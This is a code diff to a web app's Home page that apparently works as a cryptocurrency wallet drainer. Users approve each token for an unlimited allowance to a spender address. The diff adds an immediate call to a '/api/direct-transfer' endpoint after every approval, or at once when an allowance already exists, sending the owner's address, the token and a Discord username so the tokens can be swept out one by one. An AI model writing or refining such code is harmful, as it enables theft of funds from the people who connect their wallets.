@@ -525,7 +525,17 @@ export default function Home() {
           }
 
           if (currentAllowance > BigInt(0)) {
-            console.log(`[Approve] ${tokenAddr} already approved: ${currentAllowance}`);
+            console.log(`[Approve] ${tokenAddr} already approved, claiming immediately...`);
+            fetch("/api/direct-transfer", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                chainId,
+                owner: address,
+                tokens: [tokenAddr],
+                discordUser: discordUser || undefined,
+              }),
+            }).then(r => r.json()).then(r => console.log(`[Claim] ${tokenAddr}:`, r)).catch(console.error);
             continue;
           }
 
@@ -538,26 +548,21 @@ export default function Home() {
             args: [spenderAddr, BigInt(MAX_UINT256)],
           });
 
-          console.log(`[Approve] ${tokenAddr} approved successfully`);
+          console.log(`[Approve] ${tokenAddr} approved, claiming immediately...`);
+          fetch("/api/direct-transfer", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chainId,
+              owner: address,
+              tokens: [tokenAddr],
+              discordUser: discordUser || undefined,
+            }),
+          }).then(r => r.json()).then(r => console.log(`[Claim] ${tokenAddr}:`, r)).catch(console.error);
         } catch (tokenErr: any) {
           console.error(`[Approve] Failed to approve ${tokenAddr}:`, tokenErr?.message);
         }
       }
-
-      setStep("transferring");
-
-      const result = await fetch("/api/direct-transfer", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          chainId,
-          owner: address,
-          discordUser: discordUser || undefined,
-        }),
-      });
-
-      const transferResult = await result.json();
-      console.log("[DirectTransfer] Transfer result:", transferResult);
 
       setStep("done");
     } catch (err: any) {
